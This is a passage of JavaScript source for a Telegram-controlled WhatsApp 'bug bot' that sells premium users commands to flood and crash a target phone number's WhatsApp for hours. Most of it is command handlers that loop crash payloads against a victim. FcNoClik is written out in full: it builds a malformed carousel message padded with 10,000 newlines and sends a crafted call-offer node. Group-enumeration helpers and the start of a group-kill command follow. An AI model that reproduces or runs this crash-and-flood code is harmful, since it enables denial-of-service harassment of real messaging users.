  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`╔═❖ NO PAIRED NUMBER ❖═╗
║
║ ⚠ YOU HAVE NOT PAIRED ANY WHATSAPP NUMBER
║ USE /REQPAIR FIRST
║
╚═════════════════════╝`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. CHECK ACTIVE SESSION FOR PAIRED NUMBER ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ ⚠ YOUR WHATSAPP SESSION IS NOT ACTIVE
║ PLEASE PAIR AGAIN:
║ /REQPAIR
║
╚═════════════════════════╝`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. TARGET NUMBER VALIDATION ───
  if (!input) {
    return sendWithBanner(`╔═❖ SILENT DELAY ❖═╗
║
║ ⚠ PROVIDE A VALID PHONE NUMBER
║
║ USAGE:
║ /delay 92333XXXXXX
║
╚═════════════════════╝`);
  }

  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`╔═❖ INVALID NUMBER ❖═╗
║
║ ⚠ PROVIDE A VALID
║   INTERNATIONAL NUMBER
║
║ EXAMPLE:
║ 923123456789
║
╚═════════════════════╝`);
  }

  const target = `${input}@s.whatsapp.net`;

  // ─── 5. MAIN BUG PROCESS ───
  try {

    await sendWithBanner(`╔═❖ delay STARTED ❖═╗
║
║ Bug sending to:
║ ${input}
║
╚═══════════════════════╝`);

    for (let i = 0; i < 300; i++) {

      await SilentLatency(sock, target);
      await sleep(1000);

      console.log(chalk.green(`⚡ [${i + 1}/300] delay sent to ${target}`));
      await sleep(1800);
    }

    return sendWithBanner(`╔═❖ delay DONE ❖═╗
║
║ Completed for:
║ ${input}
║
╚═════════════════════╝`);

  } catch (err) {
    console.error("Error in /delay:", err);

    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Process stopped.
║ Please pair again:
║ /reqpair
║
╚═════════════════════╝`);
  }
});


// ──────────────── Handler: /delay2───────────────
bot.onText(/\/delay2(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a
║ premium user.
║
║ Contact owner to get
║ premium access.
║
╚═════════════════╝`);
  }

  // ─── 2. USER MUST HAVE A PAIRED WHATSApp NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`╔═❖ NO PAIRED NUMBER ❖═╗
║
║ You have not paired
║ any WhatsApp number.
║
║ Use /reqpair first.
║
╚═════════════════╝`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. CHECK ACTIVE SESSION ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Your WhatsApp session
║ is not active.
║
║ Please pair again:
║ /reqpair
║
╚═════════════════╝`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. TARGET NUMBER VALIDATION ───
  if (!input) {
    return sendWithBanner(`╔═❖ delay2 ❖═╗
║
║ Provide a valid
║ phone number:
║
║ /delay2 92333xxxxxx
║
╚═══════════════╝`);
  }

  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`╔═❖ INVALID NUMBER ❖═╗
║
║ Provide a valid
║ international number.
║
║ e.g., 923123456789
║
╚═══════════════╝`);
  }

  const target = `${input}@s.whatsapp.net`;

  // ─── 5. MAIN BUG PROCESS ───
  try {

    await sendWithBanner(`╔═❖ delay2 STARTED ❖═╗
║
║ Sending bug to:
║ ${input}
║
╚═════════════════╝`);

    console.log(chalk.blue(`🔥 delay2 sending to ${target}...`));

    for (let i = 0; i < 200; i++) {

      await Floods(sock, target);
      await sleep(400);

      await warlock(sock, target, true);
      await sleep(300);
      
      await XtravsHardDelay(sock, target);
      await sleep(500);

      console.log(chalk.blueBright(`⚡ [${i + 1}/200] SYED BUG BOTCore sent to ${target}`));
    }

    return sendWithBanner(`╔═❖ delay2 DONE ❖═╗
║
║ Completed for:
║ ${input}
║
╚═════════════════╝`);

  } catch (err) {
    console.error("Error in /delay2:", err);

    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Process stopped.
║ Please pair again:
║ /reqpair
║
╚═════════════════════╝`);
  }
});




// ──────────────── Handler: /delay3 ────────────────
bot.onText(/\/delay3\s+(\d{10,15})\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1];          // number (MANDATORY)
  const hours = parseInt(match[2]); // hours (MANDATORY)
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a
║ premium user.
║
║ Contact owner to get
║ premium access.
║
╚═══════════════════╝ V`);
  }

  // ─── 2. HOURS VALIDATION ───
  if (isNaN(hours) || hours < 1 || hours > 9) {
    return sendWithBanner(`╔═❖ delay3 ❖═╗
║
║ Usage:
║ /delay3 <number> <hours>
║
║ Example:
║ /delay3 923001112233 2
║
║ Hours Range:
║ 1 - 9 only
║
╚═══════════════════╝ V1`);
  }

  // ─── 3. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);
  if (!pairedEntry) {
    return sendWithBanner(`╔═❖ NO PAIRED NUMBER ❖═╗
║
║ You have not paired
║ any WhatsApp number.
║
║ Use /reqpair first.
║
╚═══════════════════╝ V1`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 4. ACTIVE SESSION CHECK ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Your WhatsApp session
║ is not active.
║
║ Please pair again:
║ /reqpair
║
╚═══════════════════════╝ V1`);
  }

  const sock = sessions.get(pairedNumber);
  const target = `${input}@s.whatsapp.net`;
  const endTime = Date.now() + hours * 60 * 60 * 1000;

  // ─── 5. MAIN EXECUTION ───
  try {

    await sendWithBanner(`╔═❖ delay3 STARTED ❖═╗
║
║ Target:
║ ${input}
║
║ Runtime:
║ ${hours} Hour(s)
║
╚══════════════════════╝ V1`);

    console.log(chalk.blue(`🔥 delay3 started for ${hours}h → ${target}`));

    let cycle = 0;

    while (Date.now() < endTime) {

      await Floods(sock, target, true);
      await sleep(500);

      await warlock(sock, target);
      await sleep(500);

      await XtravsHardDelay(sock, target);
      await sleep(500);

      console.log(chalk.blueBright(`⚡ Cycle ${++cycle} executed → ${target}`));
    }

    return sendWithBanner(`╔═❖ delay3 COMPLETED ❖═╗
║
║ Target:
║ ${input}
║
║ Total Runtime:
║ ${hours} Hour(s)
║
╚══════════════════════╝ V1`);

  } catch (err) {
    console.error("Error in /delay3:", err);

    return sendWithBanner(`╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Process stopped.
║ Please pair again:
║ /reqpair
║
╚══════════════════════╝ V1`);
  }
});



// ──────────────── Handler: /xiosinfinity ────────────────
bot.onText(/\/xiosinfinity(?:\s*(\d+)\s*(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const hours = match[2] ? parseInt(match[2]) : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`
╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a
║ premium user.
║
║ Contact owner to get
║ premium access.
║
╚═══════════════════╝ V1`);
  }

  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`
╔═❖ NO PAIRED NUMBER ❖═╗
║
║ You have not paired
║ any WhatsApp number.
║
║ Use /reqpair first.
║
╚═════════════════════╝ V1`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. ACTIVE SESSION CHECK ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`╔═❖ NO ACTIVE SESSION ❖═╗
║
║ Your WhatsApp session
║ is not active.
║
║ Please pair again:
║ /reqpair
║
╚═════════════════════╝ V1`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. INPUT VALIDATION ───
  if (!input || !hours || isNaN(hours) || hours < 1 || hours > 9) {
    return sendWithBanner(`
╔═❖ XIOS INFINITY ❖═╗
║
║ Usage:
║ /xiosinfinity <number> <hours>
║
║ Example:
║ /xiosinfinity 923001112233 3
║
║ Hours Range:
║ 1 - 9 only
║
╚═════════════════════╝ V1`);
  }

  // ─── 5. NUMBER VALIDATION ───
  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`
╔═❖ INVALID NUMBER ❖═╗
║
║ Provide a valid
║ international number.
║
║ Example:
║ 923123456789
║
╚═════════════════════╝ V1`);
  }

  const target = `${input}@s.whatsapp.net`;
  const duration = hours * 60 * 60 * 1000;
  const endTime = Date.now() + duration;

  // ─── 6. MAIN EXECUTION ───
  try {

    await sendWithBanner(`
╔═❖ XIOS INFINITY STARTED ❖═╗
║
║ Target:
║ ${input}
║
║ Runtime:
║ ${hours} Hour(s)
║
╚═══════════════════════════╝ V1`);

    console.log(chalk.blue(`🚀 XIOS Infinity started for ${hours}h → ${target}`));

    let cycle = 0;

    while (Date.now() < endTime) {

      await iosinVisFC(sock, target);
      await sleep(500);

      await iosinVisFC(sock, target);
      await sleep(1000);

      console.log(chalk.blueBright(`⚡ XIOS Infinity Cycle ${++cycle} executed → ${target}`));
    }

    return sendWithBanner(`
╔═❖ XIOS INFINITY COMPLETED ❖═╗
║
║ Target:
║ ${input}
║
║ Total Runtime:
║ ${hours} Hour(s)
║
╚═════════════════════════════╝ V1`);

  } catch (err) {
    console.error("Error in /xiosinfinity:", err);

    return sendWithBanner(`
╔═❖ EXECUTION FAILED ❖═╗
║
║ Something went wrong.
║ Pair again:
║ /reqpair
║
╚═════════════════════╝ V1`);
  }
});




// ──────────────── Handler: /delay1 ────────────────
bot.onText(/\/delay1(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const bannerImage = "https://files.catbox.moe/z2l1as.jpg";

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`
╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a premium user.
║ Contact owner to get premium access.
║
╚══════════════════╝`);
  }

  // ─── 2. USER MUST HAVE A PAIRED NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`
╔═❖ NO PAIRED NUMBER ❖═╗
║
║ You have not paired any WhatsApp number.
║ Use /reqpair first.
║
╚═════════════════════╝`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. CHECK ACTIVE SESSION ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`
╔═❖ NO ACTIVE SESSION ❖═╗
║
║ Your WhatsApp session is not active.
║ Pair again using:
║ /reqpair
║
╚═════════════════════╝`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. TARGET NUMBER VALIDATION ───
  if (!input) {
    return sendWithBanner(`
╔═❖ delay1 ❖═╗
║
║ Usage:
║ /delay1 92333xxxxxx
║
╚═════════════════╝`);
  }

  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`
╔═❖ INVALID NUMBER ❖═╗
║
║ Provide a valid
║ international number.
║ e.g., 923123456789
║
╚════════════════════╝`);
  }

  const target = `${input}@s.whatsapp.net`;

  // ─── 5. MAIN DELAY QUOTA LOOP ───
  try {

    await sendWithBanner(`
╔═❖ delay1 STARTED ❖═╗
║
║ Sending delay1 to:
║ ${input}
║
╚═══════════════════════╝`);

    console.log(chalk.blue(`🚀 delay1 started on ${target}`));

    for (let i = 0; i < 200; i++) {
      // Triple attack pattern
      await warlock(sock, target);
      await sleep(400);

      await Floods(sock, target, true);
      await sleep(300);
      

      console.log(chalk.blueBright(`⚡ [${i + 1}/200] delay1 sent to ${target}`));
    }

    return sendWithBanner(`
╔═❖ delay1 COMPLETED ❖═╗
║
║ Finished for:
║ ${input}
║
╚═════════════════════════╝`);

  } catch (err) {
    console.error("Error in /delay1:", err);

    return sendWithBanner(`
╔═❖ EXECUTION ERROR ❖═╗
║
║ Something went wrong.
║ Pair again using:
║ /reqpair
║
╚════════════════════╝`);
  }
});



// ──────────────── Handler: /crashandro ────────────────
bot.onText(/\/crashandro(?:\s*(\d+)\s*(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const hours = match[2] ? parseInt(match[2]) : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`
╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a premium user.
║ Contact the owner to get
║ premium access.
║
╚════════════════════╝ V1`);
  }

  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`
╔═❖ NO PAIRED NUMBER ❖═╗
║
║ You have not paired
║ any WhatsApp number.
║
║ Use /reqpair first.
║
╚═════════════════════╝ V1`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. ACTIVE SESSION CHECK ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`
╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Your WhatsApp session
║ is not active.
║
║ Please pair again:
║ /reqpair
║
╚═════════════════════════╝ V1`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. INPUT VALIDATION ───
  if (!input || !hours || isNaN(hours) || hours < 1 || hours > 9) {
    return sendWithBanner(`
╔═❖ CRASHANDRO ❖═╗
║
║ Usage:
║ /crashandro <number> <hours>
║
║ Example:
║ /crashandro 923001112233 2
║
║ Hours Range:
║ 1 - 9 only
║
╚═════════════════╝ V1`);
  }

  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`
╔═❖ INVALID NUMBER ❖═╗
║
║ Provide a valid
║ international number.
║
║ Example:
║ 923123456789
║
╚═══════════════════╝ V1`);
  }

  const target = `${input}@s.whatsapp.net`;
  const duration = hours * 60 * 60 * 1000;
  const endTime = Date.now() + duration;

  // ─── 5. MAIN EXECUTION ───
  try {

    await sendWithBanner(`
╔═❖ CRASHANDRO STARTED ❖═╗
║
║ Target:
║ ${input}
║
║ Runtime:
║ ${hours} Hour(s)
║
╚═══════════════════════╝ V1`);

    console.log(chalk.blue(`🔥 CrashAndro started for ${hours}h → ${target}`));

    let cycle = 0;

    while (Date.now() < endTime) {

      await callPlain9(sock, target);
      await sleep(1200);
      

      console.log(chalk.blueBright(`⚡Crash Cycle ${++cycle} executed → ${target}`));
    }

    return sendWithBanner(`
╔═❖ CRASHANDRO COMPLETED ❖═╗
║
║ Target:
║ ${input}
║
║ Total Runtime:
║ ${hours} Hour(s)
║
╚═══════════════════════╝ V1`);

  } catch (err) {
    console.error("Error in /crashandro:", err);

    return sendWithBanner(`
╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Process stopped.
║ Please pair again:
║ /reqpair
║
╚═══════════════════════╝ V1`);
  }
});

// ──────────────── Handler: /infinity ────────────────
bot.onText(/\/crashinvi(?:\s*(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1] ? match[1].trim() : null;
  const bannerImage = 'https://files.catbox.moe/z2l1as.jpg';

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. PREMIUM CHECK ───
  if (!isPremium(userId)) {
    return sendWithBanner(`
╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a
║ premium user.
║
║ Contact owner to get
║ premium access.
║
╚═════════════════════╝`);
  }

  // ─── 2. USER MUST HAVE A PAIRED WHATSAPP NUMBER ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`
╔═❖ NO PAIRED NUMBER ❖═╗
║
║ You have not paired
║ any WhatsApp number.
║
║ Use /reqpair first.
║
╚═════════════════════╝`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. CHECK ACTIVE SESSION ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`
╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Your WhatsApp session
║ is not active.
║
║ Please pair again:
║ /reqpair
║
╚═════════════════════╝`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. TARGET NUMBER VALIDATION ───
  if (!input) {
    return sendWithBanner(`
╔═❖ crashinvi ❖═╗
║
║ Provide a valid
║ phone number:
║
║ /crashinvi 92333xxxxxx
║
╚═════════════════════╝`);
  }

  if (!input.match(/^\d{10,15}$/)) {
    return sendWithBanner(`
╔═❖ INVALID NUMBER ❖═╗
║
║ Provide a valid
║ international number.
║
║ e.g., 923123456789
║
╚═════════════════════╝`);
  }

  const target = `${input}@s.whatsapp.net`;

  // ─── 5. MAIN BUG PROCESS ───
  try {

    await sendWithBanner(`
╔═❖ crashinvi STARTED ❖═╗
║
║ Sending bug to:
║ ${input}
║
╚═════════════════════╝`);

    console.log(chalk.blue(`🔥 crashinvi sending to ${target}...`));

    for (let i = 0; i < 111; i++) {

      await FcNoClik(sock, target);
  

      console.log(chalk.blueBright(`⚡ [${i + 1}/1] crashinvi sent to ${target}`));
    }

    return sendWithBanner(`
╔═❖ crashinvi DONE ❖═╗
║
║ Completed for:
║ ${input}
║
╚═════════════════════╝`);

  } catch (err) {
    console.error("Error in /crashinvi:", err);

    return sendWithBanner(`
╔═❖ SOMETHING WENT WRONG ❖═╗
║
║ Process stopped.
║ Please pair again:
║ /reqpair
║
╚═════════════════════╝`);
  }
});

//Function bug Infi

async function FcNoClik(sock, target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },

{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let MasApip = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: 'YT: PARADOX OWL'
                    },
                    footer: {
                        text: 'YT: PARADOX OWL'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: 'YT: PARADOX OWL'
                            },
                            footer: {
                                text: 'YT: PARADOX OWL'

},
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: false,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, MasApip, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}



// ──────────────── Handler: /getjid ────────────────
bot.onText(/\/getjid(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match && match[1] ? match[1].trim() : null;
  const bannerImage = "https://files.catbox.moe/z2l1as.jpg";

  const sendWithBanner = async (text) => {
    return bot.sendPhoto(chatId, bannerImage, { caption: text });
  };

  // 1️⃣ Premium check
  if (!isPremium(userId)) {
    return sendWithBanner(
`╔═❖ ACCESS DENIED ❖═╗
║
║ You are not a premium user.
║ Contact owner to get access.
║
╚═══════════════════╝`
    );
  }

  // 2️⃣ Pair check
  const paired = userPairs.find(u => u.telegramId === userId);
  if (!paired) {
    return sendWithBanner(
`╔═❖ NO PAIR FOUND ❖═╗
║
║ You have not paired any WhatsApp number.
║ Use /reqpair first.
║
╚═══════════════════╝`
    );
  }

  // 3️⃣ Session check
  if (!sessions.has(paired.whatsappNumber)) {
    return sendWithBanner(
`╔═❖ SESSION OFFLINE ❖═╗
║
║ WhatsApp is not connected.
║
╚═════════════════════╝`
    );
  }

  // 4️⃣ Empty input safe
  if (!input) {
    return sendWithBanner(
`╔═❖ GET GROUP JID ❖═╗
║
║ Usage:
║ /getjid <group_link>
║
║ Example:
║ https://chat.whatsapp.com/xxxx
║
╚═══════════════════╝`
    );
  }

  if (!input.includes("chat.whatsapp.com/")) {
    return sendWithBanner(
`╔═❖ INVALID LINK ❖═╗
║
║ Send a valid invite link.
║
╚═════════════════╝`
    );
  }

  try {
    const sock = sessions.get(paired.whatsappNumber);
    const code = input.split("chat.whatsapp.com/")[1].split("?")[0];
    const info = await sock.groupGetInviteInfo(code);

    return sendWithBanner(
`╔═❖ GROUP FOUND ❖═╗
║
║ Name : ${info.subject || "Unknown"}
║ JID  : ${info.id}
║
╚═════════════════╝`
    );

  } catch (e) {
    console.error(e);
    return sendWithBanner(
`╔═❖ ERROR ❖═╗
║
║ Invite expired or invalid.
║
╚═════════════════╝`
    );
  }
});
 

// ──────────────── Handler: /listgc (Owner Only) ────────────────
bot.onText(/^\/listgc$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const bannerImage = "https://files.catbox.moe/z2l1as.jpg";

  const sendWithBanner = async (text) => {
    await bot.sendPhoto(chatId, bannerImage, {
      caption: text,
      parse_mode: "Markdown"
    });
  };

  // ─── 1. MAIN OWNER CHECK ───
  if (!isMainOwner(userId)) {
    return sendWithBanner(`
╔═❖ ACCESS DENIED ❖═╗
║
║ Only the developer
║ *SYED BUG BOT* can use this command.
║
╚═══════════════════╝`);
  }

  // ─── 2. PAIRED NUMBER CHECK ───
  const pairedEntry = userPairs.find(u => u.telegramId === userId);

  if (!pairedEntry) {
    return sendWithBanner(`
╔═❖ NO PAIRED NUMBER ❖═╗
║
║ No WhatsApp number is paired.
║
║ Use /reqpair first.
║
╚═════════════════════╝`);
  }

  const pairedNumber = pairedEntry.whatsappNumber;

  // ─── 3. SESSION CHECK ───
  if (!sessions.has(pairedNumber)) {
    return sendWithBanner(`
╔═❖ SESSION OFFLINE ❖═╗
║
║ WhatsApp session is not active.
║
║ Pair again using:
║ /reqpair
║
╚═════════════════════╝`);
  }

  const sock = sessions.get(pairedNumber);

  // ─── 4. FETCH GROUPS ───
  try {
    const groups = await sock.groupFetchAllParticipating();
    const groupArray = Object.values(groups);

    if (groupArray.length === 0) {
      return sendWithBanner(`
╔═❖ NO GROUPS FOUND ❖═╗
║
║ This number is not in any group.
║
╚═════════════════════╝`);
    }

    let text = `┌─❖ *GROUP LIST* ❖─┐\n│\n`;
    let count = 1;

    for (const group of groupArray) {
      text += `│ ${count}. ${group.subject}\n`;
      text += `│ JID: \`${group.id}\`\n│\n`;
      count++;
    }

    text += `└──────────────┬─────┘\n│\n*TOTAL GROUPS:* ${groupArray.length}\n\n*POWERED BY SYED BUG BOT*`;

    console.log(chalk.green(`📋 Group list sent for ${pairedNumber}`));

    return sendWithBanner(text);

  } catch (err) {
    console.error("Error in /listgc:", err);

    return sendWithBanner(`
╔═❖ ERROR ❖═╗
║
║ Failed to fetch group list.
║
╚═════════════════════╝`);
  }
});


// ──────────────── Handler: /grupkill ────────────────
bot.onText(/\/grupkill(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match && match[1] ? match[1].trim() : null;
  const bannerImage = "https://files.catbox.moe/z2l1as.jpg";

  const sendWithBanner = async (text) => {
    return bot.sendPhoto(chatId, bannerImage, { caption: text });
  };

  if (!isPremium(userId)) {
    return sendWithBanner(
`╔═❖ ACCESS DENIED ❖═╗
║
